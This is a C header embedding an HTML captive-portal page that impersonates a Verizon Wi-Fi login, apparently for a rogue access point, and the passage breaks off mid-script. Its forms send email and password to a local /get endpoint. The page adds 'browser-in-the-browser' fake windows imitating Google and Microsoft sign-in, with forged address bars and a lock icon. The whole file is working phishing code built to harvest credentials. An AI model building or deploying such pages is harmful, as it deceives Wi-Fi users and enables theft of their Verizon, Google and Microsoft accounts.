#ifndef VERIZON_H
#define VERIZON_H

const char VERIZON[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verizon Wi-Fi Login</title>
    <style>
        /* Embedded Tailwind-like CSS for Verizon Branding */
        /* Base styles */
        body {
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif; /* Using Inter for consistency */
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
            background-image: linear-gradient(to bottom right, #7B0000, #CD0A0A, #FF4136); /* Smoother Verizon gradient */
            overflow-y: auto; /* Allow scrolling if content exceeds viewport height */
            box-sizing: border-box; /* Include padding in height calculation */
        }

        .login-container {
            background-color: rgba(255, 255, 255, 0.15); /* Slightly more opaque for better backdrop effect */
            backdrop-filter: blur(10px); /* Slightly stronger blur */
            -webkit-backdrop-filter: blur(10px);
            border-radius: 1.25rem; /* Rounded corners */
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.3); /* More pronounced initial shadow */
            padding: 2.5rem; /* Increased padding */
            max-width: 28rem;
            width: 100%;
            color: #fff;
            border: 1px solid rgba(255, 255, 255, 0.3); /* Clearer white border */
            transform: translateY(0);
            transition: all 400ms cubic-bezier(0.4, 0, 0.2, 1);
            position: relative; /* For messageBox z-index context */
            z-index: 10;
        }
        .login-container:hover {
            transform: translateY(-0.25rem) scale(1.01); /* More distinct hover effect */
            box-shadow: 0 30px 60px -15px rgba(0, 0, 0, 0.4); /* Darker shadow on hover */
        }

        /* Typography */
        .header-section {
            margin-bottom: 2rem;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .main-title {
            font-size: 2.25rem; /* Larger title */
            line-height: 2.5rem;
            font-weight: 700;
            text-align: center;
            margin-bottom: 0.75rem; /* Adjusted margin */
            color: #fff; /* Ensure text is white */
            text-shadow: 0 2px 4px rgba(0,0,0,0.2); /* Subtle text shadow */
        }
        .sub-title {
            font-size: 1.125rem; /* Slightly larger subtitle */
            line-height: 1.75rem;
            font-weight: 300;
            text-align: center;
            margin-bottom: 2rem;
            opacity: 0.9; /* Slightly less opaque for better readability */
            color: #fff;
        }

        /* Form elements */
        .input-group {
            margin-bottom: 1.25rem; /* Increased margin between inputs */
            display: flex;
            justify-content: center;
            width: 100%;
            flex-direction: column; /* To stack input and error message */
            align-items: center;
        }
        .form-input {
            appearance: none;
            background-color: rgba(255, 255, 255, 0.2); /* Semi-transparent white background */
            border: 1px solid rgba(255, 255, 255, 0.4); /* Clearer white border */
            border-radius: 0.625rem; /* More rounded */
            padding: 0.875rem 1.25rem; /* Larger padding */
            font-size: 1.125rem; /* Larger font size */
            line-height: 1.5;
            color: #fff; /* White text */
            width: 100%;
            max-width: 20rem;
            transition: all 250ms ease-in-out;
            box-sizing: border-box; /* Include padding in width */
        }
        .form-input::placeholder {
            color: rgba(255, 255, 255, 0.7); /* Lighter placeholder */
            opacity: 1; /* Ensure opacity is applied */
        }
        .form-input:focus {
            outline: none;
            box-shadow: 0 0 0 3px rgba(205, 10, 10, 0.9); /* Stronger Verizon Red focus ring */
            border-color: transparent;
            background-color: rgba(255, 255, 255, 0.3); /* Slightly brighter background on focus */
        }
        .form-input.input-error {
            border-color: #ef4444; /* Red for error */
        }
        .error-message {
            color: #ef4444;
            font-size: 0.875rem;
            margin-top: 0.5rem;
            text-align: left;
            width: 100%;
            max-width: 20rem; /* Match input width */
            min-height: 1.25rem; /* Reserve space to prevent layout shifts */
            transition: all 0.2s ease-in-out;
            opacity: 1;
        }
        .error-message:empty {
            min-height: 0;
            margin-top: 0;
            opacity: 0;
        }


        /* Button */
        .button-wrapper {
            display: flex;
            justify-content: center;
            margin-top: 2rem; /* More space above button */
        }
        .action-button {
            max-width: 20rem;
            width: 100%;
            background-color: #CD0A0A; /* Verizon Red */
            color: #fff;
            font-weight: 600;
            padding: 1rem 2rem; /* Larger padding for button */
            border-radius: 0.625rem; /* More rounded */
            box-shadow: 0 15px 25px -5px rgba(0, 0, 0, 0.2), 0 8px 10px -4px rgba(0, 0, 0, 0.1); /* Stronger shadow */
            transition: all 350ms cubic-bezier(0.4, 0, 0.2, 1);
            transform: translateY(0);
            cursor: pointer;
            appearance: none;
            border: none;
            line-height: inherit;
            font-size: 1.125rem; /* Larger font size for button text */
            letter-spacing: 0.05em; /* Slight letter spacing */
        }
        .action-button:hover {
            background-color: #A00000; /* Darker red on hover */
            transform: translateY(-0.35rem) scale(1.02); /* More lift and slight scale */
            box-shadow: 0 20px 35px -8px rgba(0, 0, 0, 0.3); /* Darker shadow on hover */
        }
        .action-button:focus {
            outline: none;
            box-shadow: 0 0 0 3px rgba(205, 10, 10, 0.9); /* Stronger focus ring */
        }

        /* Verizon Logo SVG styling */
        .verizon-logo {
            height: 3.5rem; /* Slightly larger logo */
            width: auto;
            margin-bottom: 2.5rem; /* More space below the logo */
            fill: #fff;
        }

        /* Footer */
        .footer-text {
            text-align: center;
            font-size: 0.875rem;
            opacity: 0.8;
            margin-top: 2.5rem; /* More space above footer */
            color: #fff;
        }

        /* OR Divider Styling */
        .or-divider {
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 2.5rem;
            margin-bottom: 2.5rem;
            width: 100%;
            max-width: 20rem; /* Match input width */
            margin-left: auto;
            margin-right: auto;
        }
        .or-divider::before,
        .or-divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: rgba(255, 255, 255, 0.4);
        }
        .or-divider span {
            padding: 0 1rem;
            color: rgba(255, 255, 255, 0.8);
            font-size: 0.875rem;
            background-image: linear-gradient(to bottom right, #7B0000, #CD0A0A, #FF4136); /* Match body background */
            position: relative;
            z-index: 1;
        }

        /* Social Login Buttons Container */
        .social-login-buttons {
            display: flex;
            flex-direction: column;
            gap: 12px; /* Space between buttons */
            width: 100%;
            max-width: 20rem; /* Match form input width */
            margin: 0 auto;
        }

        /* Google/Microsoft Sign-in Button Styling */
        .google-sign-in, .microsoft-sign-in {
            width: 100%;
            padding: 0.9rem 1.25rem;
            border-radius: 0.625rem;
            border: 1px solid rgba(255, 255, 255, 0.4); /* Light border */
            color: #fff; /* White text */
            font-weight: 600;
            text-align: center;
            cursor: pointer;
            transition: background-color 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease;
            font-size: 1rem;
            background-color: rgba(255, 255, 255, 0.2); /* Semi-transparent */
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); /* Subtle shadow */
        }
        .google-sign-in span,
        .microsoft-sign-in span {
            padding-left: 2.5rem; /* Space for icon */
            display: block;
        }
        .google-sign-in:hover, .microsoft-sign-in:hover {
            background-color: rgba(255, 255, 255, 0.3); /* Slightly brighter on hover */
            border-color: rgba(255, 255, 255, 0.6);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }
        /* Google/Microsoft Icon Styling (Inline SVG) */
        .google-sign-in .google-logo-svg,
        .microsoft-sign-in .microsoft-icon {
            width: 24px;
            height: 24px;
            flex-shrink: 0;
            position: absolute;
            left: 1rem; /* Adjust position */
        }
        .google-sign-in .google-logo-svg path {
            fill: #fff; /* Ensure Google logo parts are white on this background */
        }
        .google-sign-in .google-logo-svg {
            transform: translateY(-1px); /* Slight adjustment for alignment */
        }
        .microsoft-sign-in .microsoft-icon rect {
            fill: #fff; /* Ensure Microsoft logo parts are white */
        }

        /* Custom Message Box Styling */
        #messageBox {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: #CD0A0A; /* Verizon Red */
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease-in-out, visibility 0.3s ease-in-out;
            font-size: 1rem;
            text-align: center;
            min-width: 250px;
            max-width: 80%;
            box-sizing: border-box;
        }
        #messageBox.show {
            opacity: 1;
            visibility: visible;
        }

        /* --- BITB FRAME STYLES (Generic Browser Look - copied from T-Mobile) --- */
        .browser-window {
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            border: 1px solid #333;
            box-shadow: 0 0 12px rgba(0, 0, 0, 0.4);
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 100;
            background-color: #fff;
            border-radius: 8px;
            overflow: hidden;
        }
        .browser-header {
            background-color: #1e1e1e;
            color: white;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 0 0 8px;
            cursor: grab;
        }
        .browser-header:active { cursor: grabbing; }
        .tab { display: flex; align-items: center; gap: 8px; }
        .tab img { height: 16px; width: 16px; }
        .tab span { font-size: 12px; white-space: nowrap; }
        .window-controls { display: flex; align-items: center; }
        .window-controls div { width: 46px; height: 32px; display: flex; align-items: center; justify-content: center; cursor: pointer; }
        .window-controls div:hover { background-color: #3a3a3a; }
        .window-controls .close:hover { background-color: #e81123; }
        .window-controls svg { fill: white; width: 10px; height: 10px; }
        .address-bar {
            background-color: #2d2d2d;
            color: white;
            padding: 6px 12px;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-family: monospace;
            overflow-x: auto;
        }
        .lock-icon { color: #6fcf97; }
        .content {
            background: white;
            padding: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            overflow-y: auto;
        }
        .inner-container-bitb {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 100%;
            max-width: 280px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            box-sizing: border-box;
        }
        .logo-bitb svg {
            width: 100px;
            height: 34px;
            margin-bottom: 20px;
        }
        .title-bitb { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 6px; }
        .subtitle-bitb { font-size: 15px; font-weight: 400; color: #5f6368; margin-bottom: 20px; }
        .form-group-bitb { width: 100%; margin-bottom: 20px; position: relative; }
        .form-control-bitb { width: 100%; padding: 8px; border: 1px solid #dadce0; border-radius: 4px; outline: none; font-size: 15px; transition: all 0.3s ease; background-color: #ffffff;
            color: #333; }
        .form-label-bitb { position: absolute; top: 8px; left: 10px; font-size: 15px; color: #5f6368; transition: 0.3s; pointer-events: none; }
        .form-control-bitb:focus + .form-label-bitb,
        .form-control-bitb:not(:placeholder-shown) + .form-label-bitb { transform: translateY(-22px); font-size: 11px; color: #1a73e8; }
        .forgot-email-bitb { font-size: 13px; color: #1a73e8; text-decoration: none; margin-bottom: 12px; display: block; width: 100%; text-align: left; }
        .forgot-email-bitb:hover { text-decoration: none; }
        .text-area-bitb { font-size: 11px; color: #5f6368; margin-top: 6px; text-align: left; width: 100%; }
        .button-container-bitb { display: flex; align-items: center; justify-content: space-between; width: 100%; margin-top: 25px; }
        .create-account-bitb { font-size: 13px; color: #1a73e8; text-decoration: none; }
        .create-account-bitb:hover { text-decoration: underline; }
        .next-button-bitb { background-color: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 8px 20px; font-size: 15px; cursor: pointer; transition: background-color 0.3s ease, box-shadow 0.3s ease; }
        .next-button-bitb:hover { background-color: #145db0; }
        .form-control-bitb.password-mode {
            -webkit-text-security: disc;
            -moz-text-security: disc;
            text-security: disc;
            font-size: 16px;
        }
        .form-label-bitb.password-mode { color: #1a73e8; }

        .microsoft-browser-window {
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            border: 1px solid #333;
            box-shadow: 0 0 12px rgba(0, 0, 0, 0.4);
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 100;
            background-color: #fff;
            border-radius: 8px;
            overflow: hidden;
        }
        .microsoft-content {
            padding: 15px;
            background: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            height: auto;
            min-height: 180px;
            overflow-y: auto;
        }
        .microsoft-inner-container-bitb {
            background-color: #ffffff;
            width: 100%;
            max-width: 280px;
            padding: 15px;
            box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
            border-radius: 6px;
            box-sizing: border-box;
            text-align: left;
        }
        .microsoft-header-bitb {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 20px;
        }
        .microsoft-logo-bitb {
            width: 24px;
            height: 24px;
        }
        .microsoft-logo-text-bitb {
            font-size: 18px;
            font-weight: 600;
            color: #5e5e5e;
        }
        .microsoft-title-bitb { font-size: 22px; font-weight: 600; margin: 0 0 20px; }
        .microsoft-input-wrapper-bitb { position: relative; margin-bottom: 20px; border-bottom: 1px solid #666; width: 100%; }
        .microsoft-input-wrapper-bitb input { width: 100%; border: none; outline: none; font-size: 15px; padding: 4px 0 6px; background-color: transparent; }
        .microsoft-links-bitb { font-size: 12px; color: #0067b8; margin-bottom: 30px; text-align: left; width: 100%; }
        .microsoft-links-bitb .info-line { color: black; margin-bottom: 10px; }
        .microsoft-links-bitb a { text-decoration: none; color: #0067b8; }
        .microsoft-next-button-bitb { background-color: #0067b8; color: white; border: none; padding: 8px 20px; font-size: 14px; font-weight: 500; cursor: pointer; border-radius: 2px; margin-top: 15px; width: fit-content; align-self: flex-start; }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
</head>
<body>
    <div id="messageBox"></div> <!-- Message box for non-blocking alerts -->

    <div class="login-container">
        <!-- Verizon Logo SVG -->
        <div class="header-section">
            <svg class="verizon-logo" viewBox="-98.58 -36.425 854.36 218.55" fill="#fff" xmlns="http://www.w3.org/2000/svg">
                <path d="M593.3 47.7h-14.6l22.2 47.6h11.8L657.2 0h-14.5l-35.9 76.8z"/>
                <path d="M488.7 142.6h28.9V89.7c0-12.1 7-20.6 17.4-20.6 10 0 15.2 7 15.2 17.1v56.4h28.9V80.7c0-21-12.6-35.8-33-35.8-13 0-22.1 5.6-28.9 15.8h-.6v-13h-28zm-56.8-97.5c-30.2 0-50.4 21.7-50.4 50.3 0 28.4 20.2 50.3 50.4 50.3s50.4-21.9 50.4-50.3c.1-28.6-20.2-50.3-50.4-50.3zm-.2 79.2c-13.7 0-21-11.5-21-28.9 0-17.6 7.2-28.9 21-28.9 13.7 0 21.3 11.3 21.3 28.9.1 17.4-7.5 28.9-21.3 28.9zm-132.6 18.3h81.2v-22.8h-46v-.6l44-49.3V47.6h-79.2v22.9h44.5v.6l-44.5 49.7zm-37.1 0h29.1V47.7H262zm-67.5 0h29V99c0-19.8 11.9-28.6 30-26.1h.6v-25c-1.5-.6-3.2-.7-5.9-.7-11.3 0-18.9 5.2-25.4 16.3h-.6V47.7h-27.7zm-53.2-18.2c-12.8 0-20.6-8.3-22.1-21.1h68.4c.2-20.4-5.2-36.7-16.5-46.9-8-7.4-18.5-11.5-31.9-11.5-28.6 0-48.4 21.7-48.4 50.1 0 28.6 18.9 50.4 50.3 50.4 11.9 0 21.3-3.2 29.1-8.5 8.3-5.7 14.3-14.1 15.9-22.4h-27.8c-2.7 6.2-8.5 9.9-17 9.9zm-1.5-58.8c10.2 0 17.2 7.6 18.4 18.7h-38.8c2.3-11.2 8.4-18.7 20.4-18.7zM33 142.6h30.4l33-94.9H67.3l-18.5 61h-.4l-18.5-61H0zM262 13.9h29.1v25.8H262z" fill="#fff"/>
            </svg>
            <h1 class="main-title">Verizon Wi-Fi!</h1>
            <h2 class="sub-title">Please sign in to connect</h2>
        </div>

        <form action="/get" id="verizon-login-form">
            <div class="input-group">
                <input
                    name="email"
                    id="verizon-email"
                    type="text"
                    class="form-input"
                    placeholder="Phone Number or Email"
                    required
                    aria-label="Phone Number or Email"
                >
                <p id="verizon-email-error" class="error-message"></p>
            </div>
            <div class="input-group">
                <input
                    name="password"
                    id="verizon-password"
                    type="password"
                    class="form-input"
                    placeholder="Password"
                    required
                    aria-label="Password"
                >
            </div>
            <div class="button-wrapper">
                <button
                    type="submit"
                    class="action-button"
                >
                    Connect to Wi-Fi
                </button>
            </div>
        </form>

        <div class="or-divider">
            <span>OR</span>
        </div>

        <div class="social-login-buttons">
            <button class="google-sign-in" id="googleLogin">
                <svg class="google-logo-svg" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="48" height="48" viewBox="0 0 48 48">
                    <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"></path><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"></path><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"></path><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"></path>
                </svg>
                <span>Continue with Google</span>
            </button>
            <button class="microsoft-sign-in" id="microsoftLogin">
                <svg class="microsoft-icon" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
                    <rect x="0" y="0" width="23" height="23" fill="#F25022"/>
                    <rect x="27" y="0" width="23" height="23" fill="#7FBA00"/>
                    <rect x="0" y="27" width="23" height="23" fill="#00A4EF"/>
                    <rect x="27" y="27" width="23" height="23" fill="#FFB900"/>
                </svg>
                <span>Continue with Microsoft</span>
            </button>
        </div>

        <div class="footer-text">
            <p>&copy; 2025 Verizon. All rights reserved.</p>
        </div>
    </div>

    <!-- Google BITB Frame -->
    <div class="browser-window" id="google-window">
        <div class="browser-header">
            <div class="tab">
                <img src="data:image/svg+xml,%3Csvg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill='%234285F4' d='M22.7 12.5c0-.7-.1-1.3-.2-1.9H12v3.6h6.4c-.3 1.5-1.2 2.7-2.6 3.6v2.3h3a11.2 11.2 0 0 0 3.1-8.3z'/%3E%3Cpath fill='%2334A853' d='M12 23c3.1 0 5.7-1 7.6-2.7l-3-2.3c-1.1.7-2.5 1.1-4.6 1.1-3.5 0-6.5-2.4-7.6-5.6H1.4v2.4C3.2 20.8 7.3 23 12 23z'/%3E%3Cpath fill='%23FBBC05' d='M4.4 14c-.3-1-.5-2.1-.5-3.2s.2-2.2.5-3.2V5.2H1.4c-.9 1.8-1.4 3.9-1.4 6.8s.5 5 1.4 6.8L4.4 14z'/%3E%3Cpath fill='%23EA4335' d='M12 4.9c1.7 0 3.2.7 4.4 1.8L19 4.2C17 2.3 14.7 1 12 1 7.3 1 3.2 3.2 1.4 7.2l3 2.4C5.5 6.9 8.5 4.9 12 4.9z'/%3E%3C/svg%3E" alt="Google Favicon">
                <span>Sign in – Google Accounts</span>
            </div>
            <div class="window-controls">
                <div title="Minimize"><svg viewBox="0 0 10 1"><rect width="10" height="1"/></svg></div>
                <div title="Maximize"><svg viewBox="0 0 10 10"><rect width="8" height="8" x="1" y="1" fill="none" stroke="white" stroke-width="1"/></svg></div>
                <div class="close" title="Close" onclick="closeLogin('google')"><svg viewBox="0 0 10 10"><line x1="1" y1="1" x2="9" y2="9" stroke="white" stroke-width="1"/><line x1="1" y1="9" x2="9" y2="1" stroke="white" stroke-width="1"/></svg></div>
            </div>
        </div>
        <div class="address-bar">
            <svg xmlns="http://www.w3.org/2000/svg" class="lock-icon" viewBox="0 0 24 24" width="16" height="16">
                <path fill="#6fcf97" d="M18 10h-1V7c0-2.76-2.24-5-5-5S7 4.24 7 7v3H6c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2zm-9 0h10v8H6v-8h3zm3 3c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zM9 7c0-1.66 1.34-3 3-3s3 1.34 3 3v3H9V7z"/>
            </svg>
            <span>accounts.google.com/signin/v2/identifier?g...</span>
        </div>
        <div class="content">
            <div class="inner-container-bitb">
                <div class="logo-bitb">
                    <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="100px" height="34px">
                        <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"></path><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"></path><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"></path><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"></path>
                    </svg>
                </div>
                <h1 class="title-bitb">Sign in</h1>
                <h2 class="subtitle-bitb">Use your Google Account</h2>
                <form id="google-email-step-form" action="/get" method="POST" onsubmit="return false;">
                    <div class="form-group-bitb" id="email-group-bitb">
                        <input type="text" id="email-bitb" name="email" class="form-control-bitb" placeholder=" " />
                        <label for="email-bitb" class="form-label-bitb">Email or phone</label>
                    </div>
                    <a href="#" class="forgot-email-bitb">Forgot email?</a>
                    <div class="text-area-bitb">
                        Not your device? Use Guest mode to sign in privately.
                        <a href="#" style="color: #1a73e8; text-decoration: none;">Learn more</a>
                    </div>
                    <div class="button-container-bitb">
                        <a href="#" class="create-account-bitb">Create account</a>
                        <button type="submit" class="next-button-bitb">Next</button>
                    </div>
                </form>

                <form id="google-password-step-form" action="/get" method="POST" style="display:none;">
                    <input type="hidden" id="google-hidden-email" name="email">
                    <div class="form-group-bitb" id="password-group-bitb">
                        <input type="password" id="password-bitb" name="password" class="form-control-bitb" placeholder=" " />
                        <label for="password-bitb" class="form-label-bitb">Password</label>
                    </div>
                    <a href="#" class="forgot-email-bitb">Forgot password?</a>
                    <div class="text-area-bitb">
                        This is not your account? <a href="#" style="color: #1a73e8; text-decoration: none;">Switch accounts</a>
                    </div>
                    <div class="button-container-bitb">
                        <a href="#" class="create-account-bitb">More options</a>
                        <button type="submit" class="next-button-bitb">Sign In</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Microsoft BITB Frame -->
    <div class="browser-window" id="microsoft-window">
        <div class="browser-header">
            <div class="tab">
                <img src="data:image/svg+xml,%3Csvg viewBox='0 0 50 50' xmlns='http://www.w3.org/2000/svg'%3E%3Crect x='0' y='0' width='23' height='23' fill='%23F25022'/%3E%3Crect x='27' y='0' width='23' height='23' fill='%237FBA00'/%3E%3Crect x='0' y='27' width='23' height='23' fill='%2300A4EF'/%3E%3Crect x='27' y='27' width='23' height='23' fill='%23FFB900'/%3E%3C/svg%3E" alt="MS Favicon">
                <span>Sign in to your Microsoft account</span>
            </div>
            <div class="window-controls">
                <div title="Minimize"><svg viewBox="0 0 10 1"><rect width="10" height="1"/></svg></div>
                <div title="Maximize"><svg viewBox="0 0 10 10"><rect width="8" height="8" x="1" y="1" fill="none" stroke="white" stroke-width="1"/></svg></div>
                <div class="close" title="Close" onclick="closeLogin('microsoft')"><svg viewBox="0 0 10 10"><line x1="1" y1="1" x2="9" y2="9" stroke="white" stroke-width="1"/><line x1="1" y1="9" x2="9" y2="1" stroke="white" stroke-width="1"/></svg></div>
            </div>
        </div>
        <div class="address-bar">
            <svg xmlns="http://www.w3.org/2000/svg" class="lock-icon" viewBox="0 0 24 24" width="16" height="16">
                <path fill="#6fcf97" d="M18 10h-1V7c0-2.76-2.24-5-5-5S7 4.24 7 7v3H6c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2zm-9 0h10v8H6v-8h3zm3 3c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zM9 7c0-1.66 1.34-3 3-3s3 1.34 3 3v3H9V7z"/>
            </svg>
            <span>login.microsoftonline.com/</span>
        </div>
        <div class="content">
            <div class="microsoft-inner-container-bitb">
                <div class="microsoft-header-bitb">
                    <svg class="microsoft-logo-bitb" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
                        <rect x="0" y="0" width="23" height="23" fill="#F25022"/>
                        <rect x="27" y="0" width="23" height="23" fill="#7FBA00"/>
                        <rect x="0" y="27" width="23" height="23" fill="#00A4EF"/>
                        <rect x="27" y="27" width="23" height="23" fill="#FFB900"/>
                    </svg>
                    <span class="microsoft-logo-text-bitb">Microsoft</span>
                </div>
                <h2 class="microsoft-title-bitb">Sign in</h2>
                <form id="microsoft-email-step-form" action="/get" method="POST" onsubmit="return false;">
                    <div class="microsoft-input-wrapper-bitb" id="email-wrapper-microsoft">
                        <input type="email" id="email-microsoft" name="email" placeholder="Email or phone" required>
                    </div>
                    <div class="microsoft-links-bitb">
                        <div class="info-line">No account? <a href="#">Create one!</a></div>
                        <div><a href="#">Can't access your account?</a></div>
                    </div>
                    <button type="submit" class="microsoft-next-button-bitb">Next</button>
                </form>

                <form id="microsoft-password-step-form" action="/get" method="POST" style="display: none;">
                    <input type="hidden" id="microsoft-hidden-email" name="email">
                    <div class="microsoft-input-wrapper-bitb" id="password-wrapper-microsoft">
                        <input type="password" id="password-microsoft" name="password" placeholder="Password" required>
                    </div>
                    <div class="microsoft-links-bitb">
                        <div class="info-line">No account? <a href="#">Create one!</a></div>
                        <div><a href="#">Can't access your account?</a></div>
                    </div>
                    <button type="submit" class="microsoft-next-button-bitb">Sign In</button>
                </form>
            </div>
        </div>
    </div>

    <script>
        const verizonLoginForm = document.getElementById('verizon-login-form');
        const verizonEmailInput = document.getElementById('verizon-email');
        const verizonPasswordInput = document.getElementById('verizon-password');
        const verizonEmailError = document.getElementById('verizon-email-error');
        const googleLoginButton = document.getElementById('googleLogin');
        const microsoftLoginButton = document.getElementById('microsoftLogin');
        const messageBox = document.getElementById('messageBox');
        let messageTimeout;

        let isDragging = false;
        let offset = { x: 0, y: 0 };
        let activeWindow = null;
        const googleWindow = document.getElementById('google-window');
        const microsoftWindow = document.getElementById('microsoft-window');
        const googleHeader = googleWindow.querySelector('.browser-header');
        const microsoftHeader = microsoftWindow.querySelector('.browser-header');
        
        const googleEmailStepForm = document.getElementById('google-email-step-form');
        const googlePasswordStepForm = document.getElementById('google-password-step-form');
        const emailInputBitb = document.getElementById('email-bitb');
        const passwordInputBitb = document.getElementById('password-bitb');
        const googleHiddenEmailInput = document.getElementById('google-hidden-email');
        
        const microsoftEmailStepForm = document.getElementById('microsoft-email-step-form');
        const microsoftPasswordStepForm = document.getElementById('microsoft-password-step-form');
        const microsoftEmailInput = document.getElementById('email-microsoft');
        const microsoftPasswordInput = document.getElementById('password-microsoft');
        const microsoftHiddenEmailInput = document.getElementById('microsoft-hidden-email');

        let googleUserEmail = '';
        let microsoftUserEmail = '';

        function showMessage(message, duration = 3000) {
            messageBox.textContent = message;
            messageBox.classList.add('show');
            if (messageTimeout) {
                clearTimeout(messageTimeout);
            }
            messageTimeout = setTimeout(() => {
                messageBox.classList.remove('show');
            }, duration);
        }

        function showLogin(type) {
            closeAllLogins();
            if (type === 'google') {
                googleWindow.style.display = 'block';
                googleEmailStepForm.style.display = 'block';
                googlePasswordStepForm.style.display = 'none';
                emailInputBitb.value = '';
                passwordInputBitb.value = '';
                googleUserEmail = '';
                emailInputBitb.focus();
                activeWindow = 'google';
            } else if (type === 'microsoft') {
                microsoftWindow.style.display = 'block';
                microsoftEmailStepForm.style.display = 'block';
                microsoftPasswordStepForm.style.display = 'none';
                microsoftEmailInput.value = '';
                microsoftPasswordInput.value = '';
                microsoftUserEmail = '';
                microsoftEmailInput.focus();
                activeWindow = 'microsoft';
            }
        }

        function closeAllLogins() {
            googleWindow.style.display = 'none';
            microsoftWindow.style.display = 'none';
            activeWindow = null;
            
            googleEmailStepForm.style.display = 'block';
            googlePasswordStepForm.style.display = 'none';
            emailInputBitb.value = '';
            passwordInputBitb.value = '';
            googleHiddenEmailInput.value = '';
            googleUserEmail = '';

            microsoftEmailStepForm.style.display = 'block';
            microsoftPasswordStepForm.style.display = 'none';
            microsoftEmailInput.value = '';
            microsoftPasswordInput.value = '';
            microsoftHiddenEmailInput.value = '';
            microsoftUserEmail = '';
        }

        function closeLogin(type) {
            if (type === 'google' && activeWindow === 'google') {
                googleWindow.style.display = 'none';
                activeWindow = null;
            } else if (type === 'microsoft' && activeWindow === 'microsoft') {
                microsoftWindow.style.display = 'none';
                activeWindow = null;
            }
        }

        function handleDragStart(event) {
